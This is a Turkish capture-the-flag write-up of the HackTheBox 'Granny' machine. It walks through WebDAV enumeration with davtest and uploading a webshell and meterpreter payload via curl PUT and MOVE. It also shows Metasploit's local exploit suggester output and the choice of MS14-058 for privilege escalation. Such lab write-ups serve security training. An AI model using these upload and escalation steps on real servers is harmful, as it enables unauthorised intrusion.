---
{"dg-publish":true,"permalink":"/ctf/granny/"}
---

![Pasted image 20241026002124.png](/img/user/resimler/Pasted%20image%2020241026002124.png)

![Pasted image 20241026002500.png](/img/user/resimler/Pasted%20image%2020241026002500.png)

![Pasted image 20241026002651.png](/img/user/resimler/Pasted%20image%2020241026002651.png)

Sitede sadece “Yapım Aşamasında” yazıyor:

Başlıklar
Yanıt başlığını da kontrol edeceğim:

![Pasted image 20241026002743.png](/img/user/resimler/Pasted%20image%2020241026002743.png)
X-Powered-By: ASP.NET bana aspx dosyalarının hedefe ulaşabilirsem çalıştırılabileceğini söylüyor.


### gobuster
Bu sunucuda gobuster ile yolları aramaya başlayacağım, ancak ilginç bir şey bulamıyor:
![Pasted image 20241026003400.png](/img/user/resimler/Pasted%20image%2020241026003400.png)


### WebDAV

Arka plan
Web Distributed Authoring and Versioning (WebDAV), insanların HTTP kullanarak web siteleri oluşturmasına ve değiştirmesine izin vermek için tasarlanmış bir HTTP uzantısıdır. İlk olarak 1996 yılında, bunun korkunç bir fikir gibi görünmediği zamanlarda başlatılmıştır. Son zamanlarda HTB makinelerinde pek sık görmüyorum, ancak PWK/OSCP'de rastladım.


nmap
Nmap taramasında webdav taramasının PUT ve MOVE gibi yöntemleri gösterdiğini fark ettim. Bu şekilde dosya yükleyebilirim.


### davtest
Daha fazlasını keşfetmek için davtest'i kullanacağım ve bana ne tür dosyaların yüklenebileceğini ve bir dizin oluşturup oluşturamayacağını gösterecek:

`davtest` aracı, bir sunucunun WebDAV (Web Distributed Authoring and Versioning) özelliğini test etmek için kullanılır. WebDAV, HTTP üzerinde çalışan ve kullanıcıların uzaktan dosya yükleme, düzenleme, silme gibi işlemler yapmasına olanak tanıyan bir protokoldür. Bazı sunucular, zayıf yapılandırmalardan dolayı WebDAV erişimi açıktır, bu da potansiyel güvenlik açıkları oluşturabilir.

Bu komut, `davtest` aracını çalıştırarak belirtilen `http://10.10.10.15` URL’sindeki sunucuda WebDAV yeteneklerini test eder ve aşağıdaki işlemleri dener:

1. **Dosya Yükleme**: Sunucunun dosya yüklemeye izin verip vermediğini kontrol eder.
2. **Dosya Silme**: Sunucunun yüklenen dosyaları silmeye izin verip vermediğini test eder.
3. **Diğer HTTP Metotları**: Örneğin `PUT` veya `DELETE` gibi metotların açık olup olmadığını test eder.

Bu araç, sızma testlerinde hedefin WebDAV güvenlik yapılandırmasını değerlendirmek için faydalıdır.


```shell-session
davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: Olaf6yUu
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_Olaf6yUu
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.pl
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.txt
PUT     cgi     FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.html
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.cfm
PUT     asp     FAIL
PUT     shtml   FAIL
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.jsp
PUT     aspx    FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.jhtml
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.txt
EXEC    txt     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    jhtml   FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_Olaf6yUu
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.pl
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.txt
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.html
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.cfm
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.jsp
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.php
PUT File: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.jhtml
Executes: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.txt
Executes: http://10.10.10.15/DavTestDir_Olaf6yUu/davtest_Olaf6yUu.html

```


1.Bağlantı Testi:
* Sunucuya WebDAV bağlantısı başarıyla kuruldu, yani WebDAV erişimi açık ve kullanılabilir.

2.Dizin Oluşturma:
* MKCOL komutu ile sunucuda "DavTestDir_Olaf6yUu" adında bir dizin oluşturulmuş ve bu işlem başarılı olmuş.

3.Dosya Yükleme (PUT):
* WebDAV PUT metodu kullanılarak sunucuya çeşitli uzantılarda test dosyaları yüklenmiş.

Başarıyla yüklenen dosya türleri:
* .pl, .txt, .html, .cfm, .jsp, .php, .jhtml

Başarısız olan dosya türleri:
* .cgi, .asp, .shtml, .aspx

Bu, hedef sunucunun yalnızca belirli dosya türlerinin yüklenmesine izin verdiğini gösteriyor.

4.Dosya Çalıştırma (EXEC):
Yüklenen dosyaların çalıştırılabilir olup olmadığı test edilmiş.

Başarılı olan dosyalar:
* .txt ve .html

Başarısız olan dosyalar:
* .pl, .cfm, .jsp, .php, .jhtml

Özet:
* Test dizini başarıyla oluşturuldu.
* Bazı dosyalar sunucuya yüklendi ve çalıştırıldı, ancak çoğu dosya çalıştırılabilirlik testini geçemedi.
* Bu, sunucunun sadece belirli dosya türlerine izin verdiği anlamına gelir ve potansiyel olarak çalıştırılabilir dosyaları sınırladığı için güvenlik açısından belirli önlemler aldığını gösterir.
* Sonuç Olarak: Bu sunucunun WebDAV ayarları bazı dosya türlerini kabul ediyor ancak çoğunu çalıştırmıyor. Bu bilgiyi, WebDAV ile ilgili güvenlik zafiyetlerini araştırmak veya WebDAV üzerinden dosya yükleme/kötü amaçlı dosya çalıştırma gibi yöntemlerle istismar olanaklarını anlamak için kullanabilirsiniz.

Yükleyebileceğim birçok dosya türü var gibi görünüyor, ancak istediğim aspx değil.



### Manuel WebDav
Kendimi curl kullanarak test edeceğim. İlk olarak, bir metin dosyası koyacağım ve orada olduğunu doğrulayacağım:
![Pasted image 20241026004417.png](/img/user/resimler/Pasted%20image%2020241026004417.png)

![Pasted image 20241026004359.png](/img/user/resimler/Pasted%20image%2020241026004359.png)

![Pasted image 20241026004445.png](/img/user/resimler/Pasted%20image%2020241026004445.png)

İlk curl dosyayı web sunucusuna yerleştirir ve ikincisi orada olduğunu kanıtlar. -d @text.txt syntax, istek için verilerin text.txt dosyasının içeriği olması gerektiğini söylüyor.

Şimdi .aspx ile deneyeceğim:

```shell-session
curl -X PUT http://10.10.10.15/deneme.aspx -d @test.txt 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>


```

Tıpkı davtest'in dediği gibi, aspx dosyalarını doğrudan koyamıyorum. (403 dönderiyor.)


Araçlar
curl'den biraz daha basit bir sözdizimiyle komut satırı WebDAV etkileşimleri sağlayan cadaver adında bir araç var. Eğer bir WebDAV sunucusuna saldıracaksam, muhtemelen sadece daha kısa komutlar için bunu kullanacağım. Bununla birlikte, bu HTTP isteklerini yayınladığımda tam olarak neler olduğunu göstermek için bu yazıda curl kullanacağım. Eğer cadaver ile ilgileniyorsanız, man sayfasına göz atın.


### Network servisi şeklinde Shell

### Upload Webshell
Yapmam gereken ilk şey webshell'imi yüklemek. Kali'nin /usr/share/webshells/aspx/cmdasp.aspx adresinde basit bir tane var. Bir kopyasını alacağım:
![Pasted image 20241026004824.png](/img/user/resimler/Pasted%20image%2020241026004824.png)

![Pasted image 20241026004906.png](/img/user/resimler/Pasted%20image%2020241026004906.png)

Şimdi bunu curl ve http put yöntemini kullanarak hedefe bir txt olarak yükleyeceğim:

![Pasted image 20241026005007.png](/img/user/resimler/Pasted%20image%2020241026005007.png)

Şimdi sayfaya baktığımda kodu görebiliyorum ancak sunucu kodu metin olarak algıladığı için kod çalıştırılmıyor:

![Pasted image 20241026005035.png](/img/user/resimler/Pasted%20image%2020241026005035.png)


### Move Webshell

Şimdi bir sonraki webdav komutu olan MOVE'u kullanacağım. Bunu yine curl ile yapabilirim:

* -X MOVE - MOVE yöntemini kullanın
* -H 'Hedef:http://10.10.10.15/deneme2.aspx' - nereye taşınacağını tanımlar
* http://10.10.10.15/deneme2.txt - taşınacak dosya

![Pasted image 20241026005225.png](/img/user/resimler/Pasted%20image%2020241026005225.png)

Ve işe yarıyor:

![Pasted image 20241026005249.png](/img/user/resimler/Pasted%20image%2020241026005249.png)

![Pasted image 20241026005308.png](/img/user/resimler/Pasted%20image%2020241026005308.png)

![Pasted image 20241026005741.png](/img/user/resimler/Pasted%20image%2020241026005741.png)


### Meterpreter
Aynı şeyi bir meterpreter payload ile yapacağım. Oluşturun:

![Pasted image 20241026005859.png](/img/user/resimler/Pasted%20image%2020241026005859.png)

![Pasted image 20241026010039.png](/img/user/resimler/Pasted%20image%2020241026010039.png)

Tetiklersen başarısız olur:

![Pasted image 20241026010115.png](/img/user/resimler/Pasted%20image%2020241026010115.png)

Neden? met.txt dosyasını tekrar yüklersem, boşlukların tamamen karıştığını görebilirim:

![Pasted image 20241026010207.png](/img/user/resimler/Pasted%20image%2020241026010207.png)

![Pasted image 20241026010221.png](/img/user/resimler/Pasted%20image%2020241026010221.png)

Son satırları ve diğer kontrol karakterlerini korumak için bu kez --data-binary kullanarak tekrar yükleyeceğim:

![Pasted image 20241026010341.png](/img/user/resimler/Pasted%20image%2020241026010341.png)

met.txt dosyasını yenilediğimde çok daha temiz göründüğünü görüyorum:

Şimdi dosyayı taşıyacağım ve tetikleyeceğim:

![Pasted image 20241026010434.png](/img/user/resimler/Pasted%20image%2020241026010434.png)

tetik
![Pasted image 20241026010516.png](/img/user/resimler/Pasted%20image%2020241026010516.png)

![Pasted image 20241026010523.png](/img/user/resimler/Pasted%20image%2020241026010523.png)


### Privesc to System
Numaralandırma
Bu eski kutularda, lokal exploit'leri kontrol etme olasılığım daha yüksek ve Metasploit'in bunun için güzel bir modülü var, post/multi/recon/local_exploit_suggester:

```shell-session
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search local_exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0 
msf6 post(multi/recon/local_exploit_suggester) > set session 1 
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 196 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 11  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system                                                                                                                                                    
 12  exploit/windows/local/bits_ntlm_token_impersonation            No                       The check raised an exception.
 13  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 14  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 17  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found                                                                                                                                                         
 18  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. Target is not running a vulnerable version of Windows!                                                                                                                                        
 19  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 20  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 21  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 22  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 23  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 24  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 25  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 26  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 27  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2003 (5.2 Build 3790, Service Pack 2). is not vulnerable                                                                                                                       
 28  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 29  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 31  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The check raised an exception.
 32  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 33  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 34  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 35  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 36  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.



```


**Potansiyel Güvenlik Açıkları**:

- `local_exploit_suggester` modülü, hedef sistemde denenebilecek 196 güvenlik açığını kontrol etti.
- Aşağıdaki 7 güvenlik açığı, hedef sistemin **potansiyel olarak güvenlik açığı taşıdığını** gösterdi:

![Pasted image 20241026011414.png](/img/user/resimler/Pasted%20image%2020241026011414.png)

### MS14-058
Birini seçeceğim (biraz rastgele, ancak hedefin savunmasız göründüğünü söylediği için bunu beğendim):

**MS14-058** zafiyeti, **Windows Kernel-Mode Driver (win32k.sys)**'de bulunan bir güvenlik açığıdır. Bu zafiyet, yerel ayrıcalık yükseltmesine (Local Privilege Escalation) olanak tanır. Yani, bir saldırgan bu açığı kullanarak sistemde düşük ayrıcalıklara sahip bir hesaptan, sistem yöneticisi (admin) ayrıcalıklarına yükseltebilir.

**Açığın ana nedeni**: Windows'un belirli sistem bileşenlerine nasıl eriştiğinde ve veri işlediğinde hatalar olmasıdır. Bu hatalar, özellikle **TrackPopupMenu** işlevinin yönetiminde ortaya çıkar. Saldırgan, bu güvenlik açığını istismar ederek çekirdek belleğine yetkisiz erişim elde edebilir.

**Zafiyetin etkisi**: Saldırgan, hedef sistemde kötü niyetli bir program çalıştırarak tüm sistem üzerinde tam kontrol sahibi olabilir.

**Düzeltme**: Microsoft, bu zafiyeti kapatmak için bir güvenlik güncellemesi yayınlamıştır ve sistemlerin bu güncellemeyi alması gerekmektedir.

![Pasted image 20241026012746.png](/img/user/resimler/Pasted%20image%2020241026012746.png)


![Pasted image 20241026012920.png](/img/user/resimler/Pasted%20image%2020241026012920.png)

![Pasted image 20241026012911.png](/img/user/resimler/Pasted%20image%2020241026012911.png)



